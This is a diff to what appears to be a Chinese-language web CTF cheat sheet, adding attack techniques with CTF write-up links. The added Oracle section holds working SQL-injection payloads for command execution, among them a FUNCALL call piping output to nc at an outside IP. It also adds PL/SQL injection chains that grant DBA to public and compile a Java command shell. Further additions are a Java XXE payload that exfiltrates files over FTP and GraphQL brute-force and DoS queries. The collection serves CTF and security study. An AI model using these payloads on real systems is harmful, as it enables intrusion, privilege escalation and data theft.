@@ -1651,10 +1651,16 @@ PS1=$(cat flag)
         - database version
     - `SELECT host_name FROM v$instance;`
         - Name of the host machine
+    - `SELECT banner FROM v$version WHERE banner LIKE 'TNS%'`
+        - 作業系統版本
     - `utl_inaddr.get_host_address`
         - 本機IP
     - `select utl_inaddr.get_host_name('87.87.87.87') from dual`
         - IP反解
+    - `dba_tables`
+        - 系統所有表資訊，需要 dba 權限
+    - `user_tables`
+        - 當前使用者名下表的資訊
 - 庫名(schema)
     - `SELECT DISTINCT OWNER FROM ALL_TABLES`
 - 表名
@@ -1691,17 +1697,55 @@ PS1=$(cat flag)
     - `extractvalue()` XXE
         - `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT xxxx)||'.oob.kaibro.tw/"> %remote;]>'),'/l') FROM dual`
         - 新版已 patch
-
 - users
     - `select username from all_users`
         - lists all users of the database
     - `select name, password from sys.user$`
     - `select username,password,account_status from dba_users`
+- Java source
+    - 可以創建 Java 源碼並存成 Oracle 物件
+    - `CREATE JAVA SOURCE NAMED "xxxx" AS <Java Code>`
+- Code execution
+    - load lib
+        - `create or replace library lib_evil as '/home/oracle/evil.so';`
+        - `create or replace function cmd(str varchar2) return varchar2 as language c library lib_evil name "cmd";`
+        - `select cmd('whoami') from dual;`
+    - `dbms_java.runjava`
+        - `dbms_java.runjava('com/sun/tools/script/shell/Main -e "var p = java.lang.Runtime.getRuntime().exec(''$cmd'');"')`
+    - `DBMS_JAVA_TEST.FUNCALL`
+        - `SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/usr/bin/bash','-c','/bin/ls|/usr/bin/nc 1.2.3.4 1234') FROM DUAL;`
+    - `DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES`
+        - 利用 PL/SQL Injection 提權
+        - 影響版本: Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2
+        ```sql
+        -- 提權
+        select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS _OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to public'''';END;'';END;--','SYS',0,'1',0) from dual
+        -- 建立java command
+        select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "Command" as import java.io.*;public class Command{public static String exec(String cmd) throws Exception{String sb="";BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());BufferedReader inBr = new BufferedReader(new InputStreamReader(in));String lineStr;while ((lineStr = inBr.readLine()) != null)sb+=lineStr+"\n";inBr.close();in.close();return sb;}}'''';END;'';END;--','SYS',0,'1',0) from dual
+        -- 賦予java執行權限
+        select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''<<ALL FILES>>'''''''', ''''''''execute'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual
+        -- 創建函數
+        select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function cmd(p_cmd in varchar2) return varchar2 as language java name ''''''''Command.exec(java.lang.String) return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual
+        -- 賦予函數執行權限
+        select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on cmd to public'''';END;'';END;--','SYS',0,'1',0) from dual
+        -- 執行指令
+        select sys.cmd('cmd.exe /c whoami') from dual
+        ```
+    - `dbms_xmlquery.newcontext`
+        - 執行多語句
+        - 影響版本: oracle 10g, 11g 等，高版本已修復
+        ```sql
+        select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual;
 
+        select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual;
+
+        select OBJECT_ID from all_objects where object_name ='LINXRUNCMD';
+
+        select LINXRUNCMD('whoami') from dual;
+        ```
 - 特殊用法
     - `DBMS_XMLGEN.getXML('select user from dual')`
-    - `dbms_java.runjava('com/sun/tools/script/shell/Main -e "var p = java.lang.Runtime.getRuntime().exec(''$cmd'');"')`
-        - Java code execution
+
 ## SQLite
 
 - 子字串：
@@ -2417,7 +2461,7 @@ Content-Disposition: form-data; name="path";
 Double Boundary (前後端解析不一致):
 
 ```
-Content-Type: multipart/form-data; BOUNDARY=y:; boundary=x; 
+Content-Type: multipart/form-data; BOUNDARY=y; boundary=x; 
 
 --x
 Content-Disposition: form-data; name="test";
@@ -2702,13 +2746,27 @@ uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdro
 ## Ruby/Rails Deserialization
 
 - `BAh`: Marshal serialized data 的 base64 編碼特徵
+- `secret_key_base`
+    - 用於 `ActiveSupport::MessageVerifier` / `ActiveSupport::MessageEncryptor`
+        - sign & encrypt cookies
+        - ActiveStorage 反序列化
+    - Rails 5.2 後，可透過 `credentials.yml.enc` 和 `master.key` 還原
+        - [script](https://github.com/w181496/Web-CTF-Cheatsheet/blob/master/scripts/others/secret_key_base_decrypt.rb)
 
 ### Gadget chain
 
+- Ruby 3.4 Universal RCE Deserialization Gadget Chain by Luke Jahnke (2024)
+    - https://nastystereo.com/security/ruby-3.4-deserialization.html
+- Execute commands by sending JSON? Learn how unsafe deserialization vulnerabilities work in Ruby projects by Peter Stöckli (2024)
+    - https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/
+- Discovering Deserialization Gadget Chains in Rubyland by Alex Leahu (2024)
+    - https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
 - Ruby Deserialization - Gadget on Rails by httpvoid (2022)
     - https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md
 - Universal gadget for ruby 2.x-3.x by vakzz (2021)
     - https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
+- Universal RCE with Ruby YAML.load (versions > 2.7) by Etienne Stalmans  (2021)
+    - https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/
 - PBCTF 2020 - R0bynotes (2020)
     - ERB 無法用，改用 `ActiveModel::AttributeMethods::ClassMethods::CodeGenerator`
 - Universal gadget for ruby 2.x by elttam (2018)
@@ -2822,6 +2880,8 @@ print marshalled
     - [JNDI-Injection-Bypass](https://github.com/welk1n/JNDI-Injection-Bypass)
 - [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
 - Example
+    - [0CTF 2022 - hessian-onlyjdk](https://gist.github.com/CykuTW/4c0d105df24acf2218e0aedb67661da9)
+        - hessian2 反序列化
     - [0CTF 2022 - 3rm1](https://github.com/ceclin/0ctf-2022-soln-3rm1)
     - [Balsn CTF 2021 - 4pple Music](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2021#4pple-music)
     - [0CTF 2021 Qual - 2rm1](https://github.com/ceclin/0ctf-2021-2rm1-soln)
@@ -3456,6 +3516,38 @@ cdata.dtd:
 
 - Example: [Google CTF 2019 Qual - bnv](https://github.com/w181496/CTF/blob/master/googlectf-2019-qual/bnv/README_en.md)
 
+## Java XXE + FTP
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE ANY [
+<!ENTITY % dtd PUBLIC "-//OXML/XXE/EN" "http://127.0.0.1:8080/ftp.dtd">
+        %dtd;%ftp;%send;
+        ]>
+<ANY>xxe</ANY>
+```
+
+ftp.dtd:
+
+```xml
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % ftp "<!ENTITY &#37; send SYSTEM 'ftp://fakeuser:%file;@127.0.0.1:2121'>">
+```
+
+or
+
+```xml
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % ftp "<!ENTITY &#37; send SYSTEM 'ftp://fakeuser:pass@127.0.0.1:2121/%file;'>">
+```
+
+正常 OOB XXE 遇到檔案內容有 `\n` 會爛
+
+但 Java 環境下，部分版本透過 FTP 不會被影響:
+- `<7u141-b00` or `<8u131-b09`: 不受檔案中 `\n` 的影響
+- `>jdk8u131`: 能建立 FTP 連線，外帶檔案內容中含 `\n` 則拋出異常
+- `>jdk8u232`: 不能建立 FTP 連線，若 url 中含有 `\n` 則抛出異常
+
 ## SOAP
 
 ```xml
@@ -3740,7 +3832,7 @@ require("./index.js")
         - `<svg><svg onload=alert()>`
         - 透過 innerHTML 插入時，會立即被觸發
         - Example
-            - [Dice CTF 2022 - no-cookes](https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/)
+            - [Dice CTF 2022 - no-cookies](https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/)
             - [HITCON CTF 2022 - Self Destruct Message](https://blog.splitline.tw/hitcon-ctf-2022/)
             - [一次对 Tui Editor XSS 的挖掘与分析](https://www.leavesongs.com/PENETRATION/a-tour-of-tui-editor-xss.html)
 - Protocol
@@ -3911,6 +4003,9 @@ https://csp-evaluator.withgoogle.com/
     - Example
         - [SeikaiCTF 2023 - Golf Jail](https://blog.antoniusblock.net/posts/golfjail/)
         - [corCTF 2023 - crabspace](https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/#crabspace-4-solves)
+- Tool
+    - https://cspbypass.com/
+
 ### Upload XSS
 
 - htm
@@ -4453,6 +4548,10 @@ state[i] = state[i-3] + state[i-31]`
             - Example: 
                 - [CSAW 2021 - gatekeeping](https://lebr0nli.github.io/blog/security/nginx-gunicorn-CSAW2021/#exploit)
                 - [corCTF 2023 - pdf pal](https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/#pdf-pal-2-solves)
+    - Nginx + Swift
+        - Example: [Line CTF 2024 - zipviewer-version-clown](https://adragos.ro/line-ctf-2024/#zipviewer-version-clown)
+            - Nginx 大小寫敏感，Swift 不敏感
+            - 繞 Rate limit
     - Haproxy + Caddy
         - Haproxy: `keep-alive` + `CONNECT` + 2xx status，會讓其處於 tunnel mode，不採用任何 rules
         - Cadday: 用 normalized path 來 matching，但送出的卻不是 normalized path
@@ -4474,7 +4573,7 @@ state[i] = state[i-3] + state[i-31]`
         - [PBCTF 2023 - Makima](https://nguyendt.hashnode.dev/pbctf-2023-writeup#heading-makima)
 
 
-- Nginx目錄穿越漏洞
+- Nginx 目錄穿越漏洞
     - 常見於 Nginx 做 Reverse Proxy 的狀況
     ```
     location /files {
@@ -4664,8 +4763,64 @@ state[i] = state[i-3] + state[i-31]`
         - `${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}`
         - `${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}`
     - Example
+        - [Line CTF 2024 - Heritage](https://gist.github.com/tyage/e0afc9ff5051c2cc487a8cd9b6a1d7ea#heritage)
         - [Seikai CTF 2023 - Frog WAF](https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/#frog-waf-29-solves)
-
+        - 繞 openrasp: https://landgrey.me/blog/15/
+- GraphQL
+    - 資訊洩漏
+        - 基本查詢
+            - 查詢存在的類型: 
+                - `{ __schema { types { name } } }`
+                - `{__schema{types{name,fields{name}}}}`
+            - 查詢一個類型所有字段: 
+                - `{ __type (name: "Query") { name fields { name type { name kind ofType { name kind } } } } }`
+                - `{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}`
+                    - 提取所有類型、他的字段、參數以及參數類型
+                - 可以觀察一些敏感字段，如: password, email, token, session, secretkey, ... 等
+            - 透過 Introspection 來撈 schema:
+                - `fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}`
+        - Suggestion
+            - 當輸入一個未知的keyword，Graphql backend 會建議正確的keyword
+                - `"message": "Cannot query field \"one\" on type \"Query\". Did you mean \"node\"?",`
+            - 透過字典檔去brute-force
+                - https://github.com/Escape-Technologies/graphql-wordlist
+        - 錯誤訊息
+            - 可以透過錯誤訊息取得有用資訊
+            - `{__schema}`
+            - `{}`
+            - `{somerandomshit}`
+        - Graphene-Django DEBUG
+            - 透過添加 `__debug` 來取得詳細資訊，例如 sql 執行語句
+    - Batch query
+        - 可以透過 Array-based query 一次送好幾個請求
+        - Apollo GraphQL 預設不啟用 Array Batching
+        - 常見情境：Password brute-force, Rate limit bypass, DoS
+        - `[{ query: 'query { book(id: 1) { __typename } }' },{ query: 'query { book(id: 1) { __typename } }' }]`
+        - JSON list based batching 不能用時，可以嘗試 Query name based batching
+            - `{"query": "query { kaibro: Query { meow } kaibro1: Query { meow } }"}`
+        - Example:
+            - [Line CTF 2024 - graphql-101](https://adragos.ro/line-ctf-2024/#graphql-101)
+            - [corCTF 2023 - force](https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/#force-118-solves)
+    - CSRF
+        - GET-based
+            - `/graphql?query=query+%7B+a+%7D`
+        - POST-based
+            - content-type 改 `x-www-form-urlencoded` 仍可執行
+            - Example: Express-GraphQL, [Portswigger's lab](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)
+    - Query Depth Attack
+        - 未阻擋的話，容易造成DoS
+        - Example: `query { books { title author { title books { title author { ... } } } } }`
+    - Alias overloading
+        - Example: `query { book(id: 1) { __typename alias: __typename alias2: __typename alias3: __typename alias4: __typename } }`
+    - Tool
+        - [graphw00f](https://github.com/dolevf/graphw00f) (fingerprinting)
+        - [graphquail](https://github.com/forcesunseen/graphquail)
+        - [GraphQLmap](https://github.com/swisskyrepo/GraphQLmap)
+        - ...
+    - Example:
+        - [Line CTF 2023 - Momomomomemomemo](https://blog.huli.tw/2023/03/27/linectf-2023-writeup/#momomomomemomemo-3-solves)
+        - [VolgaCTF 2020 - library](https://github.com/w181496/CTF/tree/eedc3315e8c5719771f6ecc5efd11f9d61df314c/volgactf2020_quals/library)
+        - [HITCON 2018 - BabyQuery](https://4f-kira.github.io/2018/02/05/HITCTF2018-writeup/#BabyQuery)
 - HTTP2 Push
     - Server 自己 push 東西回來 (e.g. CSS/JS file)
     - e.g. [ALLES CTF 2020 - Push](https://github.com/0x13A0F/CTF_Writeups/tree/master/alles_ctf#push)
